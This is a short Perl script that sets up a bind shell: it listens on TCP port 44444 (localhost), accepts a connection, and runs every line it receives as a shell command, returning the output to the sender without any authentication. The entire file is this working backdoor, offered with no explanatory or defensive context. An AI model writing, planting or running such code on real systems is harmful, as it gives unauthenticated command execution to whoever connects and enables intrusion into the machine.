#!/usr/bin/perl
#Lars Sommer, lasg@lasg.dk

use IO::Socket;
my $sock=new IO::Socket::INET (Listen    => 1,
                LocalAddr => 'localhost',
	        LocalPort => 44444,
	        Proto     => 'tcp');
die unless $sock;

$z=$sock->accept();

while ($c ne "exit"){
       print $z "Command me> ";
       $ln=<$z>;
       chomp($c=$ln);
       $out=`$c`;
       print $z $out;
}

close($sock);

